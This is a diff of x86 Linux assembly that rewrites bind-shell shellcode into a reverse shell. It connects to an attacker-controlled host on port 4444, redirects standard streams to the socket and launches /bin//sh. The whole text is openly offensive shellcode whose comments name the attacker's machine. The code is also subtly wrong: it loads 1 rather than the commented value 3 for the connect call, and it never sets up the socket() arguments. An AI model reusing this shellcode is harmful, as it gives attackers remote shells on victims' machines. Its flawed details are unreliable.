@@ -1,41 +1,35 @@
-; Assume socketcall is syscall number 102, SYS_BIND is 2, SYS_LISTEN is 4, and SYS_ACCEPT is 5.
+; Assume socketcall is syscall number 102, SYS_CONNECT is 3, AF_INET is 2
+; PF_INET is same as AF_INET, SOCK_STREAM is 1, and IPPROTO_IP is 0.
 
-; First, create a socket as before
+; First, you need to create a socket using the socketcall
+mov eax, 102              ; syscall number for socketcall
+mov ebx, 1                ; SYS_SOCKET within socketcall
+lea ecx, [esp + 4]        ; pointer to arguments on the stack
+int 0x80                  ; call kernel
+mov edi, eax              ; save the returned socket descriptor
 
-; Then bind the socket to a port on the local machine
-; struct sockaddr_in as above.
+; Next, connect to the attacker's machine
+; struct sockaddr_in {
+;   short sin_family;     // e.g. AF_INET, AF_INET6
+;   unsigned short sin_port;   // e.g. htons(3490)
+;   struct in_addr sin_addr;   // see struct in_addr, below
+;   char sin_zero[8];          // zero this if you want to
+; };
 
-push dword 0x00000000      ; Any IP (INADDR_ANY)
-push dword 0x5C110002      ; The port number (4444) and AF_INET
+push dword 0x0100007F      ; Push the IP Address to the stack (127.0.0.1 for localhost, change to attacker's IP)
+push dword 0x5C110002      ; Push the port number (0x5C11 is port 4444 in network byte order) and AF_INET
 mov ecx, esp               ; Save pointer to struct sockaddr
 
-; Argument setup for the bind() call
+; Argument setup for the connect() call
 push 16                    ; sizeof(struct sockaddr)
 push ecx                   ; pointer to struct sockaddr
 push edi                   ; socket descriptor
 mov ecx, esp               ; pointer to arguments
-mov ebx, 2                 ; SYS_BIND within socketcall
+mov ebx, 1                 ; SYS_CONNECT within socketcall
 mov eax, 102               ; syscall number for socketcall
 int 0x80                   ; call kernel
 
-; Listen for incoming connections
-push 0x1                   ; Backlog argument
-push edi                   ; socket descriptor
-mov ecx, esp               ; pointer to arguments
-mov ebx, 4                 ; SYS_LISTEN within socketcall
-mov eax, 102               ; syscall number for socketcall
-int 0x80                   ; call kernel
-
-; Accept a connection
-push 0x0                   ; Size of sockaddr structure (we don't care here)
-push 0x0                   ; Address of sockaddr structure (we don't care here)
-push edi                   ; socket descriptor
-mov ecx, esp               ; pointer to arguments
-mov ebx, 5                 ; SYS_ACCEPT within socketcall
-mov eax, 102               ; syscall number for socketcall
-int 0x80                   ; call kernel
-
-                                ; Duplicate file descriptors, execute a shell as above
+; Now to duplicate file descriptors for stdin, stdout, and stderr
 dup2:
 mov ecx, 2                 ; Starting with stderr
 loop_dup2:
@@ -55,3 +49,4 @@ push 0x00                  ; terminate array with NULL
 push ebx                   ; pointer to the array ["bin//sh", NULL]
 mov ecx, esp               ; pointer to the array of pointers
 int 0x80                   ; call kernel
+
